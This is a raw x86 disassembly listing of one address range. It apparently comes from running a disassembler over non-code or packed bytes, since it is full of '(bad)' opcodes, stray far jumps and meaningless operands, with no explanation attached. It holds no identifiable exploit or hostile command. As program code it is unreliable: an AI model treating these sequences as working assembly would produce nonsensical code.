  40794f:	call   DWORD PTR [eax-0x76ffa801]
  407955:	(bad)  
  407957:	(bad)  
  407959:	adc    eax,0xbcff8300
  40795e:	pop    edi
  40795f:	call   FWORD PTR [esi]
  407961:	jmp    DWORD PTR [eax]
  407963:	add    BYTE PTR [eax],al
  407965:	push   es
  407966:	jmp    FWORD PTR [edx+0x13ccc5ff]
  40796c:	inc    DWORD PTR [esi+ebp*1+0x298318cc]
  407973:	add    ah,cl
  407975:	ins    BYTE PTR es:[edi],dx
  407976:	add    BYTE PTR [ebx-0x77],ch
  407979:	mov    ch,0xff
  40797b:	jle    0x40797c
  40797d:	scas   al,BYTE PTR es:[edi]
  40797e:	sub    edi,edi
  407980:	push   eax
  407981:	inc    ebx
  407983:	inc    DWORD PTR [eax]
  407985:	dec    esi
  407986:	add    DWORD PTR [edi+edi*8-0x37],0xffffff89
  40798b:	add    al,BYTE PTR [ebx-0x6dff2f51]
  407991:	(bad)  
  407992:	(bad)  
  407994:	(bad)  
  407995:	fild   DWORD PTR [eax]
  407997:	push   ds
  407998:	jmp    DWORD PTR [eax-0x7d]
  40799b:	mov    al,0x0
  40799d:	sub    edi,DWORD PTR [edx-0x34]
  4079a0:	push   edx
  4079a1:	add    ah,bh
  4079a3:	add    bh,bh
  4079a5:	test   BYTE PTR [eax],al
  4079a7:	jne    0x4079a9
  4079a9:	adc    BYTE PTR [eax],al
  4079ab:	fdiv   st(7),st
  4079ad:	adc    esp,DWORD PTR [edi+0x29891400]
  4079b3:	inc    DWORD PTR [ebx-0x3b00c3]
  4079b9:	(bad)  
  4079ba:	dec    DWORD PTR [ebx-0x77]
  4079bd:	stc    
  4079be:	loope  0x4079bf
  4079c0:	(bad)  
  4079c1:	(bad)  
  4079c2:	out    dx,al
  4079c3:	add    BYTE PTR [eax],al
  4079c5:	js     0x4079c6
  4079c7:	test   DWORD PTR [ebx+0x5100db],eax
  4079cd:	jmp    0x407a29
  4079cf:	dec    DWORD PTR [edi-0xffe401]
  4079d5:	xchg   ebp,eax
  4079d6:	(bad)  
  4079d7:	cmp    eax,0xe3ffa0ff
  4079dc:	inc    ebx
  4079de:	pop    eax
  4079df:	call   DWORD PTR [ebp-0x9d7d]
  4079e5:	and    DWORD PTR [eax],eax
  4079e7:	cmp    eax,DWORD PTR [eax]
  4079e9:	mov    edi,edi
  4079eb:	out    0x0,al
  4079ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ee:	mov    DWORD PTR ss:[ebx],ecx
  4079f1:	add    BYTE PTR [eax+eax*1-0x1],dh
  4079f5:	sub    eax,0x3cff1200
  4079fa:	(bad)  
  4079fb:	cli    
  4079fc:	and    ebx,0xffffff80
  4079ff:	add    bh,ah
  407a01:	inc    DWORD PTR [ebx]
  407a03:	mov    edi,edi
  407a05:	sub    al,0xff
  407a07:	in     al,dx
  407a08:	add    dl,bl
  407a0a:	mov    DWORD PTR [esi-0x1],eax
  407a0d:	es in  al,dx
  407a0f:	sub    DWORD PTR [esi-0xa201],0x6c
  407a16:	push   DWORD PTR [edx+0x2fff97ff]
  407a1c:	call   FWORD PTR [ebx-0x8fff69]
  407a22:	push   cs
  407a23:	(bad)  
  407a24:	(bad)  
  407a25:	mov    edx,0x3f83a289
  407a2a:	call   DWORD PTR [esi-0x334de401]
  407a30:	loopne 0x407a32
  407a32:	fwait
  407a33:	(bad)  
  407a34:	dec    eax
  407a36:	and    DWORD PTR [eax],0xffffffff
  407a39:	les    eax,FWORD PTR [ebx-0x12ff0077]
  407a3f:	xor    DWORD PTR ds:0x83006cff,0xffffffbc
  407a46:	push   DWORD PTR [edi+edi*8-0xf57c3e]
  407a4d:	std    
  407a4e:	sub    eax,0xa3ccc789
  407a53:	inc    DWORD PTR [eax]
  407a55:	fs add dl,dl
  407a58:	add    BYTE PTR [edi-0x1],cl
  407a5b:	xchg   ebp,eax
  407a5c:	int3   
  407a5d:	jns    0x407a55
  407a5f:	inc    eax
  407a61:	or     DWORD PTR [ecx-0xf20100],0x3b
  407a68:	dec    DWORD PTR [ebx+0x628372ff]
  407a6e:	mov    ch,0xff
  407a70:	out    dx,eax
  407a71:	add    BYTE PTR [ecx+0x6f8300],al
  407a77:	sub    al,BYTE PTR [ebx-0x5e0028]
  407a7d:	fsub   QWORD PTR [edi+edi*8]
  407a80:	cmp    eax,DWORD PTR [ebx-0xf007c48]
  407a86:	add    BYTE PTR [ecx],bl
  407a88:	add    al,dh
  407a8a:	dec    ebx
  407a8c:	(bad)  
  407a8d:	jmp    0xfffc:0xffb3ff52
  407a94:	add    BYTE PTR [edi-0x77],al
  407a97:	sar    edi,cl
  407a99:	out    dx,eax
  407a9a:	mov    DWORD PTR [esi-0x7c1d9f01],ebx
  407aa0:	push   es
  407aa1:	add    BYTE PTR [edx+0x5e8300],ch
  407aa7:	rol    BYTE PTR [ebx-0xff0089],1
  407aad:	adc    eax,0xff67ffc7
  407ab2:	std    
  407ab3:	add    bh,bh
  407ab5:	clc    
  407ab6:	int3   
  407ab7:	stos   DWORD PTR es:[edi],eax
  407ab8:	int3   
  407ab9:	cld    
  407aba:	add    BYTE PTR [ecx+ecx*4+0xa00ede6],cl
  407ac1:	xor    ecx,0x0
  407ac4:	add    al,bh
  407ac6:	add    BYTE PTR [edi],ah
  407ac8:	push   DWORD PTR [edi+edi*8+0x3b]
  407acc:	push   DWORD PTR [ebp-0x76f500cb]
  407ad2:	ud0    edi,edi
  407ad5:	cdq    
  407ad6:	add    ah,ch
  407ad8:	call   DWORD PTR [ecx+ecx*4]
  407adb:	pushf  
  407adc:	int3   
  407add:	clc    
  407ade:	mov    bh,bh
  407ae0:	dec    edx
  407ae1:	jmp    FWORD PTR [ebx+eax*4]
  407ae4:	add    BYTE PTR [ebx+0x0],al
  407ae7:	jl     0x407ae8
  407ae9:	xchg   ebp,eax
  407aea:	push   DWORD PTR [edi-0x7dad01]
  407af0:	push   ebp
  407af1:	jmp    DWORD PTR [ecx+0x0]
  407af4:	and    DWORD PTR [ebp-0x77],0x43
  407af8:	call   FWORD PTR [ecx+0x0]
  407afb:	mov    ecx,0xffa9dfff
  407b00:	adc    eax,DWORD PTR [ebx+0x71ff8359]
  407b06:	adc    DWORD PTR [ebp-0x34],0xffffff82
  407b0a:	call   ebx
  407b0c:	int3   
  407b0d:	or     eax,0x5affe6
  407b12:	xchg   esi,eax
  407b13:	add    bh,bh
  407b15:	cdq    
  407b16:	dec    DWORD PTR [esi-0x55ff4500]
  407b1c:	jmp    DWORD PTR [edx-0x8f]
  407b22:	fwait
  407b23:	inc    DWORD PTR [eax]
  407b25:	(bad)  
  407b26:	int3   
  407b27:	adc    al,0xff
  407b29:	fild   DWORD PTR [ebx+0x7d3aff8b]
  407b2f:	cmp    ebx,0x0
  407b32:	lock dec esp
  407b35:	scas   eax,DWORD PTR es:[edi]
  407b36:	jmp    DWORD PTR [ecx+0x57ff1000]
  407b3c:	int3   
  407b3d:	pushf  
  407b3e:	sti    
  407b3f:	push   ecx
  407b41:	add    BYTE PTR [ebx-0x1],ch
  407b44:	add    ah,dh
  407b46:	inc    DWORD PTR [edx]
  407b48:	or     esp,0x0
  407b4b:	dec    esi
  407b4c:	dec    DWORD PTR [esi+0x2]
  407b4f:	sub    DWORD PTR [esi-0x34],0x61
  407b53:	add    BYTE PTR [eax],al
  407b55:	aaa    
  407b56:	mov    DWORD PTR [eax-0x77],eax
  407b59:	fdivr  st,st(7)
  407b5b:	inc    eax
  407b5c:	inc    DWORD PTR [edi-0x2c]
  407b5f:	add    BYTE PTR [ebx+0xa00],bl
  407b65:	retf   0x56ff
  407b68:	and    DWORD PTR [eax+eax*1-0x7f],0xffffffff
  407b6d:	fwait
  407b6e:	test   al,0x89
  407b70:	in     al,dx
  407b71:	(bad)  
  407b72:	cmp    al,BYTE PTR [eax]
  407b74:	adc    DWORD PTR [ecx-0x34],0xffffffc8
  407b78:	jmp    DWORD PTR [eax+0x4fffc0ff]
  407b7e:	iret   
  407b7f:	call   DWORD PTR [ecx+ecx*4+0x4b]
  407b83:	inc    DWORD PTR [ebx-0x6fff17]
  407b89:	loop   0x407b8b
  407b8b:	pop    ds
  407b8c:	jmp    FWORD PTR [ebx+0x3d]
  407b8f:	call   FWORD PTR ds:0x838c00
  407b95:	mov    ebp,0x41ff6300
  407b9a:	mov    DWORD PTR [ebp-0x35be34],ebx
  407ba0:	and    eax,0x83ff8c83
  407ba5:	or     edi,edi
  407ba7:	call   0xb80d512f
  407bac:	mov    DWORD PTR [edx-0x7a],esp
  407baf:	or     DWORD PTR [esi],0xffffffff
  407bb2:	push   es
  407bb3:	dec    esp
  407bb5:	les    eax,FWORD PTR [eax]
  407bb7:	add    edi,edi
  407bb9:	jmp    0x407bbb
  407bbb:	inc    edi
  407bbc:	add    BYTE PTR [esi],ch
  407bbe:	imul   edi,edi,0xafff64
  407bc4:	dec    DWORD PTR [ebx]
  407bc6:	(bad)  
  407bc7:	(bad)  
  407bc9:	sahf   
  407bca:	add    ch,al
  407bcc:	call   DWORD PTR [edx]
  407bce:	sub    DWORD PTR [eax],eax
  407bd0:	cmp    bh,0x5b
  407bd3:	add    DWORD PTR [eax],0xffffffd3
  407bd6:	jmp    FWORD PTR [ecx+ecx*4]
  407bd9:	xchg   ecx,eax
  407bda:	jmp    DWORD PTR [esi-0x7cfdd000]
  407be0:	rol    BYTE PTR [ebx-0x5bff7c97],cl
  407be6:	add    BYTE PTR [ebx+eax*4-0x76caff7d],bl
  407bed:	inc    esp
  407bee:	ret    
  407bef:	int3   
  407bf0:	push   edx
  407bf1:	inc    DWORD PTR [eax]
  407bf3:	inc    DWORD PTR [eax]
  407bf5:	fdiv   st(7),st
  407bf7:	cmp    edi,0x1f00ca
  407bfd:	fbstp  TBYTE PTR [ecx]
  407bff:	int3   
  407c00:	stc    
  407c01:	inc    DWORD PTR [ebx-0xe0ff7d]
  407c07:	repz dec DWORD PTR [ebx-0x2600ff00]
  407c0e:	sbb    edi,edi
  407c10:	push   ss
  407c11:	add    BYTE PTR [edi],dl
  407c13:	inc    DWORD PTR [eax]
  407c15:	loop   0x407c17
  407c17:	jle    0x407c18
  407c19:	mov    esp,0xbc83c9ff
  407c1e:	mov    dh,0x89
  407c20:	cmp    eax,0xff0aff
  407c25:	sub    al,0xff
  407c27:	push   esi
  407c28:	add    BYTE PTR [eax-0x7d],dl
  407c2b:	sbb    ecx,esp
  407c2d:	out    dx,al
  407c2e:	mov    ebx,0x91ff2383
  407c33:	(bad)  
  407c34:	(bad)  
  407c35:	in     eax,dx
  407c36:	int3   
  407c37:	rol    DWORD PTR [ebx-0x2a337b],1
  407c3d:	je     0x407be0
  407c3f:	inc    DWORD PTR [edi+edi*8+0x15ff83bd]
  407c46:	jmp    DWORD PTR [esi-0x1]
  407c49:	push   ds
  407c4a:	or     DWORD PTR [edi+edi*8],0x2b
  407c4e:	xor    ecx,esp
  407c50:	lds    eax,FWORD PTR [eax]
  407c52:	or     eax,0xffe90089
  407c57:	jge    0x407c58
  407c59:	xchg   ebp,eax
  407c5a:	call   FWORD PTR [ecx-0x1]
  407c5d:	jnp    0x407c78
  407c5f:	dec    edi
  407c61:	sbb    DWORD PTR [ebx-0xf10001],0x7a
  407c68:	call   FWORD PTR [eax]
  407c6a:	push   eax
  407c6c:	int3   
  407c6d:	in     al,dx
  407c6e:	inc    edi
  407c6f:	add    BYTE PTR [eax-0x7c6601],bl
  407c75:	sub    eax,DWORD PTR [eax]
  407c77:	mov    edi,0x1b895883
  407c7c:	jmp    FWORD PTR [edx+0x24]
  407c7f:	(bad)  
  407c80:	mov    eax,0xcc00a000
  407c85:	scas   al,BYTE PTR es:[edi]
  407c86:	inc    DWORD PTR [edi-0x77]
  407c89:	mov    ds:0x1100ddff,eax
  407c8e:	js     0x407c8f
  407c90:	push   eax
  407c91:	jmp    DWORD PTR [esi]
  407c93:	(bad)  
  407c94:	inc    DWORD PTR [esi-0x1]
  407c97:	mov    BYTE PTR [ebx+0x5600c4],al
  407c9d:	xor    eax,0x9dffee
  407ca2:	fld    QWORD PTR [ebx-0x58007600]
  407ca8:	add    BYTE PTR [eax-0x3aff4901],cl
  407cae:	xchg   edi,eax
  407caf:	mov    esp,esp
  407cb1:	sub    DWORD PTR [eax-0x76747c01],0xffffffc7
  407cb8:	add    ah,cl
  407cba:	mov    edi,eax
  407cbc:	sbb    esp,0xffffffc6
  407cbf:	jmp    DWORD PTR [ebp+0x0]
  407cc2:	fld    DWORD PTR [eax]
  407cc4:	dec    DWORD PTR [ebx]
  407cc6:	push   DWORD PTR [ecx]
  407cc8:	jmp    FWORD PTR [eax+eax*1]
  407ccb:	icebp  
  407ccc:	push   ebx
  407cce:	pop    edx
  407ccf:	mov    DWORD PTR [eax],esi
  407cd1:	add    bl,bh
  407cd3:	(bad)  
  407cd4:	call   DWORD PTR ds:0x5b838fff
  407cda:	jmp    ecx
  407cdc:	call   FWORD PTR [ecx+0x68]
  407cdf:	add    BYTE PTR [ebx+0x0],al
  407ce2:	jg     0x407ce4
  407ce4:	add    BYTE PTR [edi],al
  407ce6:	call   edx
  407ce8:	add    BYTE PTR [edx-0x7d],cl
  407ceb:	ud0    esp,DWORD PTR [ecx]
  407cee:	and    eax,0xb3003c89
  407cf3:	int3   
  407cf4:	and    DWORD PTR [ecx],0xffffffcc
  407cf7:	(bad)  
  407cf8:	dec    DWORD PTR [ecx-0x54002d01]
  407cfe:	jp     0x407cff
  407d00:	push   ecx
  407d01:	add    ch,bl
  407d03:	add    bh,bh
  407d05:	jns    0x407d07
  407d07:	adc    eax,0x789afff
  407d0c:	dec    DWORD PTR [ebx+0x4300f1]
  407d12:	add    cl,BYTE PTR [ecx+0x40fffb00]
  407d18:	dec    DWORD PTR [ebx+eax*4]
  407d1b:	inc    ebp
  407d1c:	add    BYTE PTR [edx],dl
  407d1e:	jno    0x407d1f
  407d20:	mov    eax,0x8300fbff
  407d25:	pop    ds
  407d26:	(bad)  
  407d27:	mov    esi,0x3ff0f00
  407d2c:	jmp    DWORD PTR [eax]
  407d2e:	aam    0xff
  407d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d31:	add    DWORD PTR [edx],0xffffffff
  407d34:	mov    DWORD PTR [esp+ecx*8],eax
  407d37:	dec    ebp
  407d38:	jmp    DWORD PTR [eax+0x0]
  407d3b:	pop    edi
  407d3c:	mov    ecx,ecx
  407d3e:	ret    0x2cff
  407d41:	call   FWORD PTR [ecx]
  407d43:	add    BYTE PTR [ebx-0x58ff21],al
  407d49:	hlt    
  407d4a:	int3   
  407d4b:	mov    edi,0xffb79bcc
  407d50:	arpl   WORD PTR [eax],ax
  407d52:	gs (bad) 
  407d54:	(bad)  
  407d55:	mov    eax,0xc6cccf83
  407d5a:	jmp    FWORD PTR [esi]
  407d5c:	jmp    FWORD PTR [ecx+0x42]
  407d5f:	and    DWORD PTR [edx],0xffffffcc
  407d62:	push   cs
  407d63:	(bad)  
  407d64:	call   edx
  407d66:	add    BYTE PTR [edi+0xd891300],bh
  407d6c:	(bad)  
  407d6d:	mov    ecx,0x83d8832c
  407d72:	nop
  407d73:	int3   
  407d74:	adc    eax,0xffffff83
  407d77:	xchg   bh,bh
  407d79:	xor    edi,edi
  407d7b:	repz push DWORD PTR ds:0xff94830e
  407d82:	aad    0x0
  407d84:	mov    ecx,eax
  407d86:	inc    DWORD PTR ds:0x4e003589
  407d8c:	or     DWORD PTR [ebp-0x54],0xffffffcc
  407d90:	leave  
  407d91:	add    DWORD PTR [eax],0xffffffff
  407d94:	mov    DWORD PTR [esi-0x1],ebp
  407d97:	and    al,0xcc
  407d99:	xchg   ebx,eax
  407d9a:	(bad)  
  407d9b:	mov    edx,0x8972e900
  407da0:	adc    edi,edi
  407da2:	inc    edi
  407da3:	add    BYTE PTR [eax],al
  407da5:	arpl   WORD PTR [eax],ax
  407da7:	idiv   bh
  407da9:	xlat   BYTE PTR ds:[ebx]
  407daa:	(bad)  
  407dab:	mov    ebx,0x89051cff
  407db0:	sbb    al,0xff
  407db2:	ins    BYTE PTR es:[edi],dx
  407db3:	(bad)  
  407db4:	inc    DWORD PTR [ebx-0x69ff1c77]
  407dba:	add    BYTE PTR [esi],bl
  407dbc:	add    BYTE PTR [ebx+edx*8+0x4300c989],cl
  407dc3:	dec    esp
  407dc5:	mov    BYTE PTR [eax],0x97
  407dc8:	call   FWORD PTR [ebx]
  407dca:	(bad)  
  407dcb:	jge    0x407dcc
  407dcd:	dec    esp
  407dce:	ret    
  407dcf:	add    BYTE PTR [esi-0x1],dl
  407dd2:	and    eax,0xffc78900
  407dd7:	fdiv   st(7),st
  407dd9:	(bad)  
  407dda:	sbb    esp,0x0
  407ddd:	lods   eax,DWORD PTR ds:[esi]
  407dde:	leave  
  407ddf:	call   FWORD PTR [edi-0xfffd00]
  407de5:	lock jmp edx
  407de8:	add    BYTE PTR [eax+0x0],ah
  407deb:	das    
  407dec:	or     ebx,0xffffffe3
  407def:	jmp    DWORD PTR [eax+0x0]
  407df2:	out    0x0,al
  407df4:	push   DWORD PTR [ebx]
  407df6:	dec    DWORD PTR [eax+eax*1]
  407df9:	pop    es
  407dfa:	int3   
  407dfb:	rol    BYTE PTR [ebx-0x5d7c6b39],0xcc
  407e02:	rol    DWORD PTR [eax],0x0
  407e05:	das    
  407e06:	mov    DWORD PTR [edi],ebx
  407e08:	xor    DWORD PTR [ebp+0x9ff9c83],0x76
  407e0f:	dec    DWORD PTR [eax-0x1]
  407e12:	xor    edi,edi
  407e14:	add    DWORD PTR [esi+0x5bff70ff],0xffffffff
  407e1b:	enter  0x8cff,0xb3
  407e1f:	add    BYTE PTR [eax],ch
  407e21:	add    BYTE PTR [eax+0xa7ffff],bh
  407e27:	jge    0x407e29
  407e29:	adc    edi,edi
  407e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e2c:	adc    eax,0xffffffd4
  407e2f:	add    BYTE PTR [ecx-0x7cff9300],bl
  407e35:	xor    bh,bh
  407e37:	jecxz  0x407dc2
  407e39:	add    eax,0x25837500
  407e3e:	pop    edi
  407e3f:	mov    ebp,ecx
  407e41:	add    BYTE PTR [edx],dl
  407e43:	int3   
  407e44:	inc    DWORD PTR [ebx]
  407e46:	add    DWORD PTR [ecx],0x0
  407e49:	sbb    eax,0xa0007183
  407e4e:	cmc    
  407e4f:	(bad)  
  407e50:	jg     0x407e51
  407e52:	stc    
  407e53:	add    bh,bh
  407e55:	retf   0xbe83
  407e58:	dec    DWORD PTR [ecx]
  407e5a:	int3   
  407e5b:	test   DWORD PTR [eax],0xda009c2f
  407e61:	push   DWORD PTR [ebx]
  407e63:	cmp    edi,0x14
  407e66:	int3   
  407e67:	push   es
  407e68:	xor    DWORD PTR [edx-0x1],0xffffffe4
  407e6c:	add    BYTE PTR [esi-0x6c],al
  407e6f:	(bad)  
  407e70:	jnp    0x407e72
  407e72:	pop    es
  407e73:	int3   
  407e74:	(bad)  
  407e75:	(bad)  [ecx-0x7c9e0077]
  407e7b:	sub    eax,0x51ebff
  407e80:	mov    edi,edi
  407e82:	dec    DWORD PTR gs:[ecx+0x3fff7]
  407e89:	push   ss
  407e8a:	mov    DWORD PTR [ebx+eax*4+0x1affb3b9],edx
  407e91:	add    BYTE PTR [esi],dl
  407e93:	int3   
  407e94:	sub    DWORD PTR [ebx-0x1],0xffffff8c
  407e98:	dec    DWORD PTR [ecx+ecx*4+0x7ed300d5]
  407e9f:	int3   
  407ea0:	stc    
  407ea1:	(bad)  
  407ea2:	cli    
  407ea3:	inc    DWORD PTR [eax]
  407ea5:	jnp    0x407ea6
  407ea7:	dec    eax
  407ea8:	mov    DWORD PTR [ecx+0x0],esp
  407eab:	int3   
  407eac:	call   DWORD PTR [ecx+0x74ffec]
  407eb2:	push   esp
  407eb3:	(bad)  
  407eb4:	inc    DWORD PTR [edi]
  407eb6:	add    BYTE PTR [edx+0x0],ch
  407eb9:	test   BYTE PTR [ebx-0x573c00e4],al
  407ebf:	int3   
  407ec0:	sub    bh,bh
  407ec2:	fcos   
  407ec4:	call   FWORD PTR [ebp-0x1dff6d01]
  407eca:	push   DWORD PTR [eax]
  407ecc:	mov    DWORD PTR [edx-0x397c8a],esi
  407ed2:	stc    
  407ed3:	add    BYTE PTR [eax],al
  407ed5:	or     BYTE PTR [ebx-0x7635ff3f],al
  407edb:	cld    
  407edc:	mov    eax,edi
  407ede:	sar    bh,0x71
  407ee1:	mov    DWORD PTR [eax+0x0],edi
  407ee4:	jmp    FWORD PTR [edi+0x118987ff]
  407eea:	add    BYTE PTR [esi],cl
  407eec:	jmp    DWORD PTR [edi+0x41]
  407eef:	int3   
  407ef0:	rol    BYTE PTR [ebx+0x49ffff8a],cl
  407ef6:	call   DWORD PTR [ebp+0x66ff86ff]
  407efc:	add    BYTE PTR [esi+edx*4],ah
  407eff:	jmp    ecx
  407f01:	mov    esi,ebx
  407f03:	inc    DWORD PTR [eax]
  407f05:	jb     0x407f07
  407f07:	sbb    edi,edi
  407f09:	adc    al,0x0
  407f0b:	add    al,0x0
  407f0d:	xchg   DWORD PTR [eax-0x32ff9901],esi
  407f13:	(bad)  
  407f14:	call   FWORD PTR [esi+0x0]
  407f17:	out    dx,al
  407f18:	mov    DWORD PTR [ebp-0x2eff2e7d],ebx
  407f1e:	loopne 0x407eec
  407f20:	enter  0x61ff,0x0
  407f24:	or     DWORD PTR [esi+0x3a83dbff],0x0
  407f2b:	add    BYTE PTR [eax],al
  407f2d:	add    BYTE PTR [ebx-0x72ff5134],dl
  407f33:	add    bh,bh
  407f35:	mov    eax,0xe1ff2b00
  407f3a:	add    BYTE PTR [ecx-0xa40301],bh
  407f40:	sar    edi,1
  407f42:	dec    ecx
  407f43:	inc    DWORD PTR [eax]
  407f45:	mov    DWORD PTR es:0xc0ff8e00,eax
  407f4c:	add    BYTE PTR [eax+0x6f00b8],bl
  407f52:	mov    bl,0x83
  407f54:	int3   
  407f55:	sub    eax,0xeb00ae89
  407f5a:	add    BYTE PTR [edx+0x103aff],ch
  407f60:	fiadd  DWORD PTR [ebx-0x10ff00ba]
  407f66:	call   FWORD PTR [edi]
  407f68:	jmp    FWORD PTR [ecx-0x1]
  407f6b:	lds    eax,FWORD PTR [eax]
  407f6d:	or     cl,al
  407f6f:	sub    DWORD PTR [edx+0x0],0xffffff84
  407f73:	inc    DWORD PTR [eax]
  407f75:	aas    
  407f76:	add    dl,al
  407f78:	add    bh,ah
  407f7a:	dec    DWORD PTR [eax-0x76084d01]
  407f80:	jmp    0xff11:0x83893283
  407f87:	pop    esi
  407f88:	add    BYTE PTR [esi+0x5ccc58ff],bh
  407f8e:	(bad)  
  407f8f:	push   DWORD PTR [ebp-0x34]
  407f92:	inc    DWORD PTR es:[eax]
  407f95:	add    BYTE PTR [eax],al
  407f97:	mov    bl,0xff
  407f99:	lock dec DWORD PTR [ecx-0x1]
  407f9d:	pop    edx
  407f9e:	mov    cl,0xcc
  407fa0:	add    eax,0xccff7c00
  407fa5:	inc    edx
  407fa6:	jmp    FWORD PTR [edi+edi*8]
  407fa9:	add    DWORD PTR [eax],eax
  407fab:	bound  eax,QWORD PTR [eax]
  407fad:	cwde   
  407fae:	cdq    
  407faf:	(bad)  
  407fb0:	out    dx,al
  407fb1:	jmp    DWORD PTR [ecx]
  407fb3:	add    BYTE PTR [eax],al
  407fb5:	mov    esp,0xc100ffff
  407fba:	call   FWORD PTR [ecx-0xfdd57d]
  407fc0:	imul   edi,edi,0xfffffff2
  407fc3:	cmp    edi,0x68
  407fc6:	push   DWORD PTR [esi+0x1300b700]
  407fcc:	(bad)  
  407fcd:	ds ins DWORD PTR es:[edi],dx
  407fcf:	add    BYTE PTR ds:0x830002ff,ah
  407fd5:	xchg   ebx,eax
  407fd6:	dec    DWORD PTR [eax-0x3c006400]
  407fdc:	mov    DWORD PTR [edi],edx
  407fde:	inc    ebp
  407fdf:	mov    DWORD PTR [ebx+eax*4+0x6d],eax
  407fe3:	int3   
  407fe4:	call   FWORD PTR [ecx]
  407fe6:	(bad)  
  407fe7:	fild   DWORD PTR [eax]
  407fe9:	inc    edi
  407fea:	and    DWORD PTR [edi-0xc99c00],0xa
  407ff1:	call   FWORD PTR [edi+edi*8-0x1]
  407ff5:	xchg   BYTE PTR [ecx-0x45ff73],cl
  407ffb:	adc    al,0x0
  407ffd:	jb     0x407fe3
  407fff:	dec    esi
  408001:	adc    esi,0x0
  408004:	call   DWORD PTR [ecx-0x7d]
  408007:	add    BYTE PTR [bx+di+0xfff],al
  40800c:	dec    edi
  40800e:	stos   DWORD PTR es:[edi],eax
  40800f:	mov    DWORD PTR [edi-0xdc01],ecx
  408015:	dec    eax
  408016:	add    al,dl
  408018:	call   FWORD PTR [ebp+0x14ccd3ff]
  40801e:	pop    ebp
  40801f:	(bad)  
  408020:	aas    
  408021:	sbb    edx,0x0
  408024:	call   FWORD PTR [esi-0x34]
  408027:	fild   DWORD PTR [eax]
  408029:	or     al,0x0
  40802b:	add    DWORD PTR [eax],0xfb0023c2
  408031:	add    BYTE PTR [edx],ah
  408033:	dec    esp
  408035:	call   0x5400:0x46ff13ff
  40803c:	(bad)  
  40803d:	jnp    0x407ffd
  40803f:	mov    DWORD PTR [eax+eax*1],ebp
  408042:	dec    eax
  408043:	add    bh,bh
  408045:	(bad)  
  408046:	inc    ebp
  408048:	push   DWORD PTR [esi+0x0]
  40804b:	mov    dh,0x89
  40804d:	xchg   DWORD PTR [ecx-0x48335f34],edi
  408053:	mov    edi,edi
  408055:	outs   dx,BYTE PTR ds:[esi]
  408056:	add    BYTE PTR [eax-0x39003e01],al
  40805c:	add    bh,bh
  40805e:	mov    ch,0x83
  408060:	cmc    
  408061:	int3   
  408062:	cmc    
  408063:	(bad)  
  408064:	inc    DWORD PTR [edi+edi*8-0x97ffa4]
  40806b:	and    eax,DWORD PTR [eax]
  40806d:	cmp    al,0x9f
  40806f:	add    BYTE PTR [eax],al
  408071:	add    BYTE PTR [ebp-0x12ff34],al
  408077:	inc    edx
  408078:	push   DWORD PTR [esi]
  40807a:	dec    DWORD PTR ds:0xccdfcc
  408080:	imul   edi,edi,0x4889ff49
  408086:	int3   
  408087:	outs   dx,BYTE PTR ds:[esi]
  408088:	(bad)  
  408089:	(bad)  
  40808b:	jnp    0x408016
  40808d:	data16 inc BYTE PTR [ebx-0xbf7c55]
  408094:	inc    DWORD PTR [eax]
  408096:	and    DWORD PTR [ebx-0x1],0xffffff83
  40809a:	call   DWORD PTR [ecx-0x7d0000]
  4080a0:	verw   WORD PTR [ebp-0x1]
  4080a4:	add    BYTE PTR ds:0x4eff08ff,ch
  4080aa:	add    BYTE PTR [edx],cl
  4080ac:	dec    DWORD PTR [edi+0x3]
  4080af:	add    dl,cl
  4080b1:	jmp    esi
  4080b3:	mov    edi,edi
  4080b5:	pop    eax
  4080b6:	add    BYTE PTR [eax-0x1],bh
  4080b9:	xchg   ebx,eax
  4080ba:	add    BYTE PTR [edx-0xa66601],dl
  4080c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c1:	call   ebp
  4080c3:	mov    DWORD PTR [eax],eax
  4080c5:	jb     0x4080c6
  4080c7:	test   BYTE PTR [ebx-0x7c9c0049],al
  4080cd:	sbb    DWORD PTR [edi],ecx
  4080cf:	int3   
  4080d0:	in     al,dx
  4080d1:	call   FWORD PTR [ebp-0xbd0000]
  4080d7:	(bad)  
  4080d8:	dec    edi
  4080da:	int3   
  4080db:	mov    edi,edi
  4080dd:	ror    ecx,0xff
  4080e0:	int3   
  4080e1:	call   FWORD PTR [ebp-0x1]
  4080e4:	inc    DWORD PTR [eax+eax*1+0x77]
  4080e8:	mov    DWORD PTR [esp+ecx*8+0x43],esp
  4080ec:	jmp    FWORD PTR [edi]
  4080ee:	or     eax,0x75ff5200
  4080f3:	add    bh,bh
  4080f5:	loope  0x4080f6
  4080f7:	icebp  
  4080f8:	(bad)  
  4080f9:	fcos   
  4080fb:	ret    
  4080fc:	mov    DWORD PTR ds:0x8343ff02,esp
  408102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408103:	add    ah,cl
  408105:	cmp    BYTE PTR [ebx-0x7c9000a0],al
  40810b:	scas   eax,DWORD PTR es:[edi]
  40810c:	push   DWORD PTR [ecx-0x40]
  40810f:	inc    DWORD PTR [edi-0x7d]
  408112:	inc    WORD PTR [eax]
  408115:	mov    BYTE PTR [eax],0xa2
  408118:	add    BYTE PTR [esi+0x6affd800],bh
  40811e:	sbb    BYTE PTR [eax],al
  408120:	mov    al,0xcc
  408122:	out    0x83,eax
  408124:	inc    DWORD PTR [ebx-0x2fffd07d]
  40812a:	jmp    DWORD PTR [edi]
  40812c:	sbb    eax,0x4d
  40812f:	jmp    ecx
  408131:	(bad)  
  408132:	cmp    eax,0xff75ff00
  408137:	mov    ecx,0x9bffea00
  40813c:	add    BYTE PTR [edx+0x5],bl
  40813f:	push   esp
  408141:	mov    DWORD PTR ds:0xffee00ff,esp
  408147:	jno    0x408148
  408149:	repz int3 
  40814b:	pop    esi
  40814c:	cmp    DWORD PTR [ebx-0x23],0x0
  408150:	lea    eax,[eax]
  408152:	adc    edi,edi
  408154:	dec    DWORD PTR [edi]
  408156:	(bad)  
  408157:	fiadd  DWORD PTR [ebx-0x7c8f764c]
  40815d:	mov    cl,0x82
  40815f:	add    BYTE PTR [esi+0x0],ah
  408162:	cmc    
  408163:	inc    DWORD PTR [eax]
  408165:	gs int3 
  408167:	dec    eax
  408168:	int3   
  408169:	call   0x6b401d6d
  40816e:	lahf   
  40816f:	add    BYTE PTR [ebx+eax*4-0x6d00006e],ch
  408176:	(bad)  
  408177:	mov    eax,0x7a00f2ff
